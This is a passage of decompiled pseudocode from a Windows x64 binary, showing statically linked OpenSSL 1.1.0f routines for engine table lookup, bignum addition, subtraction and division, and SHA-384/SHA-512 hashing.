    v13 = *a1;
    --i;
    v19[0] = *a4;
    v14 = sub_14003EF50(v13, (__int64)v19);
    if ( !v14 )
    {
      v15 = sub_14001D8E0(0x20ui64);
      v14 = v15;
      if ( !v15 )
        goto LABEL_17;
      v15[6] = 1;
      *v15 = *a4;
      v16 = sub_1400296C0();
      v14[1] = v16;
      if ( !v16 )
      {
        sub_14001D930(v14);
        goto LABEL_17;
      }
      v14[2] = 0i64;
      sub_14003ED50(*a1, (__int64)v14);
    }
    sub_1400293F0(v14[1], a3);
    if ( !(unsigned int)sub_1400297C0((int *)v14[1], a3) )
      goto LABEL_17;
    *((_DWORD *)v14 + 6) = 0;
    if ( a6 )
    {
      if ( !(unsigned int)sub_140025B10(a3) )
      {
        sub_140024610(38, 184, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_table.c", 125);
        goto LABEL_17;
      }
      v17 = v14[2];
      if ( v17 )
        sub_140025A60(v17, 0);
      v14[2] = a3;
      *((_DWORD *)v14 + 6) = 1;
    }
  }
  v10 = 1;
LABEL_17:
  sub_140025CE0((_DWORD *)qword_140147E80);
  return v10;
}
// 140041685: conditional instruction was optimized away because rbx.8==0
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140147E80: using guessed type __int64 qword_140147E80;
// 140041620: using guessed type int var_38[8];

//----- (00000001400417E0) ----------------------------------------------------
__int64 __fastcall sub_1400417E0(__int64 *a1, int a2)
{
  __int64 v2; // rbx
  __int64 v6; // rcx
  _QWORD *v7; // rax
  _QWORD *v8; // rdi
  __int64 v9; // rcx
  int v10; // esi
  __int64 v11; // rax
  __int64 v12; // rcx
  int v13[10]; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0i64;
  if ( !*a1 )
    return 0i64;
  sub_1400248C0();
  sub_140025D20((_DWORD *)qword_140147E80);
  v6 = *a1;
  if ( *a1 )
  {
    v13[0] = a2;
    v7 = sub_14003EF50(v6, (__int64)v13);
    v8 = v7;
    if ( v7 )
    {
      v9 = v7[2];
      if ( v9 && (unsigned int)sub_140025B10(v9) || *((_DWORD *)v8 + 6) )
      {
        v2 = v8[2];
      }
      else
      {
        v2 = sub_140029880(v8[1], 0);
        v10 = 1;
        if ( v2 )
        {
          while ( *(int *)(v2 + 160) <= 0 && (byte_140143110 & 1) != 0 || !(unsigned int)sub_140025B10(v2) )
          {
            v11 = sub_140029880(v8[1], v10++);
            v2 = v11;
            if ( !v11 )
              goto LABEL_20;
          }
          if ( v8[2] != v2 && (unsigned int)sub_140025B10(v2) )
          {
            v12 = v8[2];
            if ( v12 )
              sub_140025A60(v12, 0);
            v8[2] = v2;
          }
        }
      }
LABEL_20:
      *((_DWORD *)v8 + 6) = 1;
    }
  }
  sub_140025CE0((_DWORD *)qword_140147E80);
  sub_1400244F0();
  return v2;
}
// 140143110: using guessed type char byte_140143110;
// 140147E80: using guessed type __int64 qword_140147E80;
// 1400417E0: using guessed type int var_28[10];

//----- (0000000140041910) ----------------------------------------------------
void __fastcall sub_140041910(__int64 a1)
{
  __int64 v2; // rcx

  if ( a1 )
  {
    sub_1400294B0(*(void ***)(a1 + 8));
    v2 = *(_QWORD *)(a1 + 16);
    if ( v2 )
      sub_140025A60(v2, 0);
    sub_14001D930((void *)a1);
  }
}

//----- (0000000140041960) ----------------------------------------------------
__int64 __fastcall sub_140041960(unsigned int *a1, __int64 a2)
{
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD, _QWORD))a2)(
           *a1,
           *((_QWORD *)a1 + 1),
           *((_QWORD *)a1 + 2),
           *(_QWORD *)(a2 + 8));
}

//----- (0000000140041990) ----------------------------------------------------
void __fastcall sub_140041990(void *a1)
{
  sub_14001D930(a1);
}

//----- (00000001400419B0) ----------------------------------------------------
void *__fastcall sub_1400419B0(size_t a1)
{
  return sub_14001D8E0(a1);
}

//----- (00000001400419D0) ----------------------------------------------------
void *__fastcall sub_1400419D0(size_t a1)
{
  void *result; // rax
  void *v3; // rbx

  result = sub_14001D8E0(a1);
  v3 = result;
  if ( result )
  {
    memset(result, 0, a1);
    return v3;
  }
  return result;
}

//----- (0000000140041A10) ----------------------------------------------------
__int64 __fastcall sub_140041A10(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // ebp
  __int64 *v4; // rbx
  __int64 *v5; // rdi
  __int64 result; // rax

  v3 = *(_DWORD *)(a2 + 16);
  v4 = (__int64 *)a3;
  v5 = (__int64 *)a2;
  if ( *(_DWORD *)(a3 + 16) == v3 )
  {
    result = sub_140041BA0(a1, a2, a3);
    *(_DWORD *)(a1 + 16) = v3;
  }
  else
  {
    if ( v3 )
    {
      v5 = (__int64 *)a3;
      v4 = (__int64 *)a2;
    }
    if ( (int)sub_140027600(v5, v4) >= 0 )
    {
      if ( !(unsigned int)sub_140041C70(a1, (__int64)v5, (__int64)v4) )
        return 0i64;
      *(_DWORD *)(a1 + 16) = 0;
      return 1i64;
    }
    else
    {
      if ( !(unsigned int)sub_140041C70(a1, (__int64)v4, (__int64)v5) )
        return 0i64;
      *(_DWORD *)(a1 + 16) = 1;
      return 1i64;
    }
  }
  return result;
}

//----- (0000000140041AC0) ----------------------------------------------------
__int64 __fastcall sub_140041AC0(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // ebp
  __int64 v4; // rbx
  __int64 v5; // rsi
  bool v7; // zf
  int v9; // edx

  v3 = 0;
  v4 = a3;
  v5 = a2;
  if ( *(_DWORD *)(a2 + 16) )
  {
    if ( *(_DWORD *)(a3 + 16) )
    {
      v5 = a3;
      v7 = 1;
      v4 = a2;
    }
    else
    {
      v3 = 1;
      v7 = 0;
    }
  }
  else
  {
    v7 = *(_DWORD *)(a3 + 16) == 0;
  }
  if ( v7 )
  {
    v9 = *(_DWORD *)(v4 + 8);
    if ( *(_DWORD *)(v5 + 8) > v9 )
      v9 = *(_DWORD *)(v5 + 8);
    if ( !sub_140027B30(a1, v9) )
      return 0i64;
    if ( (int)sub_140027600((__int64 *)v5, (__int64 *)v4) >= 0 )
    {
      if ( !(unsigned int)sub_140041C70(a1, v5, v4) )
        return 0i64;
      *(_DWORD *)(a1 + 16) = 0;
    }
    else
    {
      if ( !(unsigned int)sub_140041C70(a1, v4, v5) )
        return 0i64;
      *(_DWORD *)(a1 + 16) = 1;
    }
  }
  else
  {
    if ( !(unsigned int)sub_140041BA0(a1, v5, v4) )
      return 0i64;
    *(_DWORD *)(a1 + 16) = v3;
  }
  return 1i64;
}

//----- (0000000140041BA0) ----------------------------------------------------
__int64 __fastcall sub_140041BA0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r15
  __int64 v4; // rsi
  int v6; // edi
  __int64 v7; // rbp
  int v8; // ebx
  __int64 result; // rax
  char *v10; // rsi
  char *v11; // rdi
  unsigned __int64 v12; // r8
  unsigned __int64 *v13; // rdi
  char *i; // rsi
  __int64 v15; // rdx
  unsigned __int64 v16; // rdx

  v3 = a3;
  v4 = a2;
  if ( *(_DWORD *)(a2 + 8) < *(_DWORD *)(a3 + 8) )
  {
    v3 = a2;
    v4 = a3;
  }
  v6 = *(_DWORD *)(v4 + 8);
  v7 = *(int *)(v3 + 8);
  v8 = v6 - v7;
  result = (__int64)sub_140027B30(a1, v6 + 1);
  if ( result )
  {
    *(_DWORD *)(a1 + 8) = v6;
    v10 = *(char **)v4;
    v11 = *(char **)a1;
    v12 = sub_140070880(*(char **)a1, v10, *(char **)v3, v7);
    v13 = (unsigned __int64 *)&v11[8 * v7];
    for ( i = &v10[8 * v7]; v8; --v8 )
    {
      v15 = *(_QWORD *)i;
      i += 8;
      v16 = v12 + v15;
      *v13++ = v16;
      v12 = (v16 == 0) & (unsigned __int8)v12;
    }
    *v13 = v12;
    result = 1i64;
    *(_DWORD *)(a1 + 8) += v12;
    *(_DWORD *)(a1 + 16) = 0;
  }
  return result;
}

//----- (0000000140041C70) ----------------------------------------------------
__int64 __fastcall sub_140041C70(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // eax
  int v4; // ebp
  __int64 v6; // r15
  int v7; // ebx
  char *v11; // rdi
  char *v12; // rsi
  __int64 v13; // rdx
  char *v14; // rdi
  char *i; // rsi
  __int64 v16; // rcx

  v4 = *(_DWORD *)(a2 + 8);
  v6 = *(int *)(a3 + 8);
  v7 = v4 - v6;
  if ( v4 - (int)v6 < 0 )
  {
    sub_140024610(v3 - 45, v3 + 67, v3 + 52, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_add.c", 121);
    return 0i64;
  }
  if ( !sub_140027B30(a1, v4) )
    return 0i64;
  v11 = *(char **)a2;
  v12 = *(char **)a1;
  v13 = sub_140075060(*(char **)a1, v11, *(char **)a3, v6);
  v14 = &v11[8 * v6];
  for ( i = &v12[8 * v6]; v7; --v7 )
  {
    v16 = *(_QWORD *)v14;
    v14 += 8;
    i += 8;
    *((_QWORD *)i - 1) = v16 - v13;
    v13 = (v16 == 0) & (unsigned __int8)v13;
  }
  *(_DWORD *)(a1 + 8) = v4;
  *(_DWORD *)(a1 + 16) = 0;
  sub_1400278D0(a1);
  return 1i64;
}
// 140041CBB: variable 'v3' is possibly undefined

//----- (0000000140041D70) ----------------------------------------------------
__int64 __fastcall sub_140041D70(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  int v5; // eax
  int v6; // r14d
  _QWORD *v10; // r13
  int v11; // eax
  int *v13; // rbp
  __int64 v14; // r15
  _QWORD *v15; // r12
  int v16; // edi
  int v17; // ecx
  int v18; // edx
  __int64 v19; // rcx
  __int64 v20; // rdx
  __int64 v21; // rdi
  int v22; // r8d
  __int64 v23; // rax
  unsigned __int64 v24; // rbp
  unsigned __int64 v25; // r14
  unsigned __int64 *v26; // rsi
  unsigned __int64 *v27; // rbx
  unsigned __int64 *v28; // r13
  __int64 v29; // rbx
  int v30; // edx
  int v31; // r15d
  __int64 v32; // rbx
  unsigned __int64 v33; // rdi
  unsigned __int64 v34; // rax
  __int64 v35; // r9
  unsigned __int64 v36; // rbx
  unsigned __int64 v37; // r8
  unsigned __int64 v38; // rdx
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // rcx
  unsigned __int64 v41; // r8
  unsigned __int64 v42; // rcx
  unsigned __int64 v43; // r8
  unsigned __int64 v44; // rdx
  unsigned __int64 v45; // r10
  unsigned __int64 v46; // rax
  bool v47; // zf
  int v48; // edi
  int v49; // [rsp+30h] [rbp-88h]
  int v50; // [rsp+38h] [rbp-80h]
  __int64 v51; // [rsp+38h] [rbp-80h]
  int v52; // [rsp+44h] [rbp-74h]
  unsigned __int64 *v53; // [rsp+48h] [rbp-70h]
  __int64 v54; // [rsp+48h] [rbp-70h]
  char **v55; // [rsp+50h] [rbp-68h]
  char *v56; // [rsp+58h] [rbp-60h] BYREF
  int v57; // [rsp+60h] [rbp-58h]
  int v58; // [rsp+64h] [rbp-54h]
  int v59; // [rsp+68h] [rbp-50h]
  _QWORD *v60; // [rsp+70h] [rbp-48h]
  _QWORD *v61; // [rsp+C0h] [rbp+8h]

  v61 = a1;
  v5 = *(_DWORD *)(a3 + 8);
  v6 = 0;
  v49 = 0;
  v10 = a1;
  if ( v5 > 0 && !*(_QWORD *)(*(_QWORD *)a3 + 8i64 * (v5 - 1))
    || (v11 = *(_DWORD *)(a4 + 8), v11 > 0) && !*(_QWORD *)(*(_QWORD *)a4 + 8i64 * (v11 - 1)) )
  {
    sub_140024610(3, 107, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_div.c", 157);
    return 0i64;
  }
  if ( (unsigned int)sub_140027070(a3, 4u) || (unsigned int)sub_140027070(a4, 4u) )
  {
    v6 = 1;
    v49 = 1;
  }
  if ( sub_140027160(a4) )
  {
    sub_140024610(3, 107, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_div.c", 179);
    return 0i64;
  }
  if ( v6 || (int)sub_140027600((__int64 *)a3, (__int64 *)a4) >= 0 )
  {
    v13 = a5;
    sub_140027D40(a5);
    v55 = (char **)sub_140027C40(a5);
    v60 = sub_140027C40(a5);
    v14 = (__int64)v60;
    v15 = sub_140027C40(a5);
    if ( !v10 )
    {
      v10 = sub_140027C40(a5);
      v61 = v10;
    }
    if ( !v15 )
      goto LABEL_76;
    if ( !v10 )
      goto LABEL_76;
    if ( !v55 )
      goto LABEL_76;
    if ( !v60 )
      goto LABEL_76;
    v16 = 64 - (int)sub_140027260(a4) % 64;
    if ( !(unsigned int)sub_140046E40((__int64)v15, (__int64 *)a4, v16) )
      goto LABEL_76;
    *((_DWORD *)v15 + 4) = 0;
    v52 = v16 + 64;
    if ( !(unsigned int)sub_140046E40(v14, (__int64 *)a3, v16 + 64) )
      goto LABEL_76;
    *(_DWORD *)(v14 + 16) = 0;
    if ( v6 )
    {
      v17 = *((_DWORD *)v15 + 2);
      v18 = *(_DWORD *)(v14 + 8);
      if ( v18 > v17 + 1 )
      {
        if ( !sub_140027B30(v14, v18 + 1) )
          goto LABEL_76;
        *(_QWORD *)(*(_QWORD *)v14 + 8i64 * (int)(*(_DWORD *)(v14 + 8))++) = 0i64;
      }
      else
      {
        if ( !sub_140027B30(v14, v17 + 2) )
          goto LABEL_76;
        v19 = *(int *)(v14 + 8);
        if ( (int)v19 < *((_DWORD *)v15 + 2) + 2 )
        {
          v20 = 8 * v19;
          do
          {
            v20 += 8i64;
            LODWORD(v19) = v19 + 1;
            *(_QWORD *)(v20 + *(_QWORD *)v14 - 8) = 0i64;
          }
          while ( (int)v19 < *((_DWORD *)v15 + 2) + 2 );
        }
        *(_DWORD *)(v14 + 8) = *((_DWORD *)v15 + 2) + 2;
      }
    }
    v21 = *((int *)v15 + 2);
    v22 = *(_DWORD *)(v14 + 8);
    v59 = 0;
    v23 = *(_QWORD *)v14;
    v57 = v21;
    v50 = v22 - v21;
    v56 = (char *)(v23 + 8i64 * (v22 - (int)v21));
    v58 = *(_DWORD *)(v14 + 12) - (v22 - v21);
    v24 = *(_QWORD *)(*v15 + 8i64 * ((int)v21 - 1));
    if ( (_DWORD)v21 == 1 )
      v25 = 0i64;
    else
      v25 = *(_QWORD *)(*v15 + 8i64 * ((int)v21 - 2));
    v26 = (unsigned __int64 *)(*(_QWORD *)v14 + 8i64 * (v22 - 1));
    if ( sub_140027B30((__int64)v10, v22 - (int)v21 + 1) )
    {
      *((_DWORD *)v10 + 4) = *(_DWORD *)(a3 + 16) ^ *(_DWORD *)(a4 + 16);
      *((_DWORD *)v10 + 2) = v50 - v49;
      LODWORD(v51) = v50 - 1;
      v27 = (unsigned __int64 *)(*v10 + 8i64 * (int)v51);
      v53 = v27;
      if ( sub_140027B30((__int64)v55, (int)v21 + 1) )
      {
        if ( !v49 )
        {
          if ( (int)sub_140027600((__int64 *)&v56, v15) < 0 )
          {
            --*((_DWORD *)v10 + 2);
          }
          else
          {
            sub_140075060(v56, v56, (char *)*v15, v21);
            *v27 = 1i64;
          }
        }
        v28 = v27 + 1;
        v29 = (__int64)v61;
        v30 = *((_DWORD *)v61 + 2);
        if ( !v30 )
          *((_DWORD *)v61 + 4) = 0;
        if ( (int)v51 > 0 )
        {
          v51 = (unsigned int)v51;
          v31 = v21;
          if ( v30 )
            v28 = v53;
          v54 = 8 * v21;
          do
          {
            v32 = *(v26 - 1);
            if ( *v26 == v24 )
            {
              v33 = -1i64;
            }
            else
            {
              v34 = sub_1400709C0(*v26, *(v26 - 1), v24);
              v35 = (unsigned int)v34;
              v33 = v34;
              v36 = v32 - v24 * v34;
              v37 = HIDWORD(v34) * (unsigned int)v25;
              v38 = HIDWORD(v34) * HIDWORD(v25);
              v39 = (unsigned int)v34 * HIDWORD(v25);
              v40 = v38 + 0x100000000i64;
              v41 = v39 + v37;
              if ( v41 >= v39 )
                v40 = v38;
              v42 = HIDWORD(v41) + v40;
              v43 = v41 << 32;
              v44 = v42 + 1;
              v45 = v43 + v35 * (unsigned int)v25;
              if ( v45 >= v43 )
                v44 = v42;
              if ( v44 >= v36 )
              {
                do
                {
                  if ( v44 == v36 && v45 <= *(v26 - 2) )
                    break;
                  --v33;
                  v36 += v24;
                  if ( v36 < v24 )
                    break;
                  v46 = v44 - 1;
                  if ( v45 >= v25 )
                    v46 = v44;
                  v45 -= v25;
                  v44 = v46;
                }
                while ( v46 >= v36 );
              }
            }
            *(_QWORD *)&(*v55)[v54] = sub_140073520(*v55, (char *)*v15, v31, v33);
            v56 -= 8;
            if ( sub_140075060(v56, v56, *v55, v31 + 1) )
            {
              --v33;
              if ( sub_140070880(v56, v56, (char *)*v15, v31) )
                ++*v26;
            }
            --v28;
            --v26;
            v47 = v51-- == 1;
            *v28 = v33;
          }
          while ( !v47 );
          v14 = (__int64)v60;
          v29 = (__int64)v61;
        }
        sub_1400278D0(v14);
        if ( a2 )
        {
          v48 = *(_DWORD *)(a3 + 16);
          sub_140047090(a2, v14, v52);
          if ( !sub_140027160(a2) )
            *(_DWORD *)(a2 + 16) = v48;
        }
        if ( v49 )
          sub_1400278D0(v29);
        sub_140027B60((__int64)a5);
        return 1i64;
      }
    }
    v13 = a5;
LABEL_76:
    sub_140027B60((__int64)v13);
    return 0i64;
  }
  if ( a2 && !sub_140026E90(a2, a3) )
    return 0i64;
  if ( v10 )
    sub_140027560((__int64)v10, 0i64);
  return 1i64;
}

//----- (0000000140042360) ----------------------------------------------------
__int64 __fastcall sub_140042360(__int64 a1)
{
  *(_DWORD *)(a1 + 212) = 48;
  *(_QWORD *)a1 = 0xCBBB9D5DC1059ED8ui64;
  *(_QWORD *)(a1 + 8) = 0x629A292A367CD507i64;
  *(_QWORD *)(a1 + 16) = 0x9159015A3070DD17ui64;
  *(_QWORD *)(a1 + 24) = 0x152FECD8F70E5939i64;
  *(_QWORD *)(a1 + 32) = 0x67332667FFC00B31i64;
  *(_QWORD *)(a1 + 40) = 0x8EB44A8768581511ui64;
  *(_QWORD *)(a1 + 48) = 0xDB0C2E0D64F98FA7ui64;
  *(_QWORD *)(a1 + 56) = 0x47B5481DBEFA4FA4i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 208) = 0;
  return 1i64;
}

//----- (00000001400423F0) ----------------------------------------------------
__int64 __fastcall sub_1400423F0(_BYTE *a1, __int64 a2)
{
  __int64 v2; // r14
  _BYTE *v3; // rsi
  unsigned __int64 v6; // r14
  int v8; // eax
  __int64 v9; // rcx
  __int64 v10; // rcx
  __int64 v11; // rcx
  __int64 v12; // rcx
  __int64 v13; // rcx
  __int64 v14; // rcx
  __int64 v15; // rcx
  __int64 v16; // rcx
  __int64 v17; // rcx
  __int64 v18; // rcx
  __int64 v19; // rcx
  __int64 v20; // rcx
  __int64 v21; // rcx
  __int64 v22; // rdx

  v2 = *(unsigned int *)(a2 + 208);
  v3 = (_BYTE *)(a2 + 80);
  *(_BYTE *)(v2 + a2 + 80) = 0x80;
  v6 = v2 + 1;
  if ( v6 > 0x70 )
  {
    memset(&v3[v6], 0, 128 - v6);
    v6 = 0i64;
    sub_140042B20((__int64 *)a2, (__int64)v3, 1i64);
  }
  memset(&v3[v6], 0, 112 - v6);
  v3[127] = *(_BYTE *)(a2 + 64);
  v3[126] = BYTE1(*(_DWORD *)(a2 + 64));
  v3[125] = BYTE2(*(_DWORD *)(a2 + 64));
  v3[124] = HIBYTE(*(_DWORD *)(a2 + 64));
  v3[123] = BYTE4(*(_QWORD *)(a2 + 64));
  v3[122] = (unsigned __int16)WORD2(*(_QWORD *)(a2 + 64)) >> 8;
  v3[121] = *(_BYTE *)(a2 + 70);
  v3[120] = *(_BYTE *)(a2 + 71);
  v3[119] = *(_BYTE *)(a2 + 72);
  v3[118] = BYTE1(*(_DWORD *)(a2 + 72));
  v3[117] = BYTE2(*(_DWORD *)(a2 + 72));
  v3[116] = HIBYTE(*(_DWORD *)(a2 + 72));
  v3[115] = BYTE4(*(_QWORD *)(a2 + 72));
  v3[114] = (unsigned __int16)WORD2(*(_QWORD *)(a2 + 72)) >> 8;
  v3[113] = *(_BYTE *)(a2 + 78);
  v3[112] = *(_BYTE *)(a2 + 79);
  sub_140042B20((__int64 *)a2, (__int64)v3, 1i64);
  if ( !a1 )
    return 0i64;
  v8 = *(_DWORD *)(a2 + 212);
  if ( v8 == 48 )
  {
    v17 = *(_QWORD *)a2;
    *a1 = HIBYTE(*(_QWORD *)a2);
    a1[1] = BYTE6(v17);
    a1[2] = BYTE5(v17);
    a1[3] = BYTE4(v17);
    a1[4] = BYTE3(v17);
    a1[5] = BYTE2(v17);
    a1[6] = BYTE1(v17);
    a1[7] = v17;
    v18 = *(_QWORD *)(a2 + 8);
    a1[8] = HIBYTE(v18);
    a1[9] = BYTE6(v18);
    a1[10] = BYTE5(v18);
    a1[11] = BYTE4(v18);
    a1[12] = BYTE3(v18);
    a1[13] = BYTE2(v18);
    a1[14] = BYTE1(v18);
    a1[15] = v18;
    v19 = *(_QWORD *)(a2 + 16);
    a1[16] = HIBYTE(v19);
    a1[17] = BYTE6(v19);
    a1[18] = BYTE5(v19);
    a1[19] = BYTE4(v19);
    a1[20] = BYTE3(v19);
    a1[21] = BYTE2(v19);
    a1[22] = BYTE1(v19);
    a1[23] = v19;
    v20 = *(_QWORD *)(a2 + 24);
    a1[24] = HIBYTE(v20);
    a1[25] = BYTE6(v20);
    a1[26] = BYTE5(v20);
    a1[27] = BYTE4(v20);
    a1[28] = BYTE3(v20);
    a1[29] = BYTE2(v20);
    a1[30] = BYTE1(v20);
    a1[31] = v20;
    v21 = *(_QWORD *)(a2 + 32);
    a1[32] = HIBYTE(v21);
    a1[33] = BYTE6(v21);
    a1[34] = BYTE5(v21);
    a1[35] = BYTE4(v21);
    a1[36] = BYTE3(v21);
    a1[37] = BYTE2(v21);
    a1[38] = BYTE1(v21);
    a1[39] = v21;
    v22 = *(_QWORD *)(a2 + 40);
    a1[40] = HIBYTE(v22);
    a1[41] = BYTE6(v22);
    a1[42] = BYTE5(v22);
    a1[43] = BYTE4(v22);
    a1[44] = BYTE3(v22);
    a1[45] = BYTE2(v22);
    a1[46] = BYTE1(v22);
    a1[47] = v22;
  }
  else
  {
    if ( v8 != 64 )
      return 0i64;
    v9 = *(_QWORD *)a2;
    *a1 = HIBYTE(*(_QWORD *)a2);
    a1[1] = BYTE6(v9);
    a1[2] = BYTE5(v9);
    a1[3] = BYTE4(v9);
    a1[4] = BYTE3(v9);
    a1[5] = BYTE2(v9);
    a1[6] = BYTE1(v9);
    a1[7] = v9;
    v10 = *(_QWORD *)(a2 + 8);
    a1[8] = HIBYTE(v10);
    a1[9] = BYTE6(v10);
    a1[10] = BYTE5(v10);
    a1[11] = BYTE4(v10);
    a1[12] = BYTE3(v10);
    a1[13] = BYTE2(v10);
    a1[14] = BYTE1(v10);
    a1[15] = v10;
    v11 = *(_QWORD *)(a2 + 16);
    a1[16] = HIBYTE(v11);
    a1[17] = BYTE6(v11);
    a1[18] = BYTE5(v11);
    a1[19] = BYTE4(v11);
    a1[20] = BYTE3(v11);
    a1[21] = BYTE2(v11);
    a1[22] = BYTE1(v11);
    a1[23] = v11;
    v12 = *(_QWORD *)(a2 + 24);
    a1[24] = HIBYTE(v12);
    a1[25] = BYTE6(v12);
    a1[26] = BYTE5(v12);
    a1[27] = BYTE4(v12);
    a1[28] = BYTE3(v12);
    a1[29] = BYTE2(v12);
    a1[30] = BYTE1(v12);
    a1[31] = v12;
    v13 = *(_QWORD *)(a2 + 32);
    a1[32] = HIBYTE(v13);
    a1[33] = BYTE6(v13);
    a1[34] = BYTE5(v13);
    a1[35] = BYTE4(v13);
    a1[36] = BYTE3(v13);
    a1[37] = BYTE2(v13);
    a1[38] = BYTE1(v13);
    a1[39] = v13;
    v14 = *(_QWORD *)(a2 + 40);
    a1[40] = HIBYTE(v14);
    a1[41] = BYTE6(v14);
    a1[42] = BYTE5(v14);
    a1[43] = BYTE4(v14);
    a1[44] = BYTE3(v14);
    a1[45] = BYTE2(v14);
    a1[46] = BYTE1(v14);
    a1[47] = v14;
    v15 = *(_QWORD *)(a2 + 48);
    a1[48] = HIBYTE(v15);
    a1[49] = BYTE6(v15);
    a1[50] = BYTE5(v15);
    a1[51] = BYTE4(v15);
    a1[52] = BYTE3(v15);
    a1[53] = BYTE2(v15);
    a1[54] = BYTE1(v15);
    a1[55] = v15;
    v16 = *(_QWORD *)(a2 + 56);
    a1[56] = HIBYTE(v16);
    a1[57] = BYTE6(v16);
    a1[58] = BYTE5(v16);
    a1[59] = BYTE4(v16);
    a1[60] = BYTE3(v16);
    a1[61] = BYTE2(v16);
    a1[62] = BYTE1(v16);
    a1[63] = v16;
  }
  return 1i64;
}

//----- (0000000140042980) ----------------------------------------------------
__int64 __fastcall sub_140042980(__int64 a1)
{
  *(_DWORD *)(a1 + 212) = 64;
  *(_QWORD *)a1 = 0x6A09E667F3BCC908i64;
  *(_QWORD *)(a1 + 8) = 0xBB67AE8584CAA73Bui64;
  *(_QWORD *)(a1 + 16) = 0x3C6EF372FE94F82Bi64;
  *(_QWORD *)(a1 + 24) = 0xA54FF53A5F1D36F1ui64;
  *(_QWORD *)(a1 + 32) = 0x510E527FADE682D1i64;
  *(_QWORD *)(a1 + 40) = 0x9B05688C2B3E6C1Fui64;
  *(_QWORD *)(a1 + 48) = 0x1F83D9ABFB41BD6Bi64;
  *(_QWORD *)(a1 + 56) = 0x5BE0CD19137E2179i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 208) = 0;
  return 1i64;
}

//----- (0000000140042A10) ----------------------------------------------------
__int64 __fastcall sub_140042A10(__int64 a1, char *a2, size_t a3)
{
  char *v3; // rbp
  size_t v4; // rbx
  char *v5; // rsi
  size_t v7; // rax
  size_t v8; // rcx
  __int64 v9; // rax
  char *v10; // rcx
  __int64 v11; // r14
  char *v12; // rsi

  v3 = (char *)(a1 + 80);
  v4 = a3;
  v5 = a2;
  if ( a3 )
  {
    v7 = *(_QWORD *)(a1 + 64);
    v8 = v7 + 8 * a3;
    if ( v8 < v7 )
      ++*(_QWORD *)(a1 + 72);
    *(_QWORD *)(a1 + 72) += a3 >> 61;
    v9 = *(unsigned int *)(a1 + 208);
    *(_QWORD *)(a1 + 64) = v8;
    if ( (_DWORD)v9 )
    {
      v10 = &v3[v9];
      v11 = 128 - v9;
      if ( a3 < 128 - v9 )
      {
        memmove(v10, a2, a3);
        *(_DWORD *)(a1 + 208) += v4;
        return 1i64;
      }
      memmove(v10, a2, 128 - v9);
      *(_DWORD *)(a1 + 208) = 0;
      v4 -= v11;
      v5 += v11;
      sub_140042B20((__int64 *)a1, (__int64)v3, 1i64);
    }
    if ( v4 >= 0x80 )
    {
      sub_140042B20((__int64 *)a1, (__int64)v5, v4 >> 7);
      v12 = &v5[v4];
      v4 &= 0x7Fu;
      v5 = &v12[-v4];
    }
    if ( v4 )
    {
      memmove(v3, v5, v4);
      *(_DWORD *)(a1 + 208) = v4;
    }
  }
  return 1i64;
}

//----- (0000000140042B20) ----------------------------------------------------
void __fastcall sub_140042B20(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r11
  __int64 v4; // rax
  __int64 v5; // r9
  __int64 v6; // r10
  __int64 v7; // rbp
  __int64 v8; // rsi
  __int64 v9; // rdi
  __int64 v10; // r12
  unsigned __int8 *v11; // r13
  __int64 v12; // r14
  unsigned __int64 v13; // rdx
  __int64 v14; // r10
  unsigned __int64 v15; // rbx
  unsigned __int64 v16; // rdx
  __int64 v17; // r9
  unsigned __int64 v18; // r15
  unsigned __int64 v19; // rdx
  __int64 v20; // r8
  unsigned __int64 v21; // rdi
  unsigned __int64 v22; // rdx
  __int64 v23; // r11
  unsigned __int64 v24; // rsi
  __int64 v25; // rdx
  __int64 v26; // rbx
  unsigned __int64 v27; // r10
  __int64 v28; // rdx
  __int64 v29; // r15
  unsigned __int64 v30; // rbp
  __int64 v31; // rdx
  __int64 v32; // rdi
  unsigned __int64 v33; // r14
  __int64 v34; // rdx
  __int64 v35; // rsi
  __int64 v36; // r11
  __int64 v37; // r8
  __int64 v38; // r10
  __int64 v39; // r13
  __int64 v40; // r8
  __int64 v41; // rbp
  __int64 v42; // rax
  __int64 v43; // r8
  __int64 v44; // r14
  __int64 v45; // r12
  __int64 v46; // r8
  __int64 v47; // r11
  __int64 v48; // rbx
  __int64 v49; // r8
  __int64 v50; // r13
  __int64 v51; // rdi
  __int64 v52; // r8
  __int64 v53; // rax
  __int64 v54; // rsi
  unsigned __int64 v55; // r9
  __int64 v56; // r8
  __int64 v57; // r12
  __int64 v58; // rbp
  _QWORD *v59; // r10
  __int64 v60; // r8
  unsigned __int64 v61; // r11
  __int64 v62; // rbx
  __int64 v63; // r14
  __int64 v64; // r8
  __int64 v65; // rdi
  __int64 v66; // r10
  __int64 v67; // r8
  __int64 v68; // rsi
  __int64 v69; // r15
  unsigned __int64 v70; // rdx
  unsigned __int64 v71; // rbp
  unsigned __int64 v72; // r11
  __int64 v73; // rdx
  __int64 v74; // r14
  unsigned __int64 v75; // rbx
  __int64 v76; // rdx
  __int64 v77; // r10
  unsigned __int64 v78; // rdi
  __int64 v79; // rdx
  __int64 v80; // r15
  unsigned __int64 v81; // rsi
  unsigned __int64 v82; // rdx
  unsigned __int64 v83; // r11
  __int64 v84; // rbp
  __int64 v85; // rdx
  __int64 v86; // rbx
  __int64 v87; // r14
  __int64 v88; // r8
  __int64 v89; // rdi
  __int64 v90; // r13
  __int64 v91; // r8
  __int64 v92; // rsi
  __int64 v93; // rax
  unsigned __int64 v94; // r8
  unsigned __int64 v95; // rbp
  __int64 v96; // r12
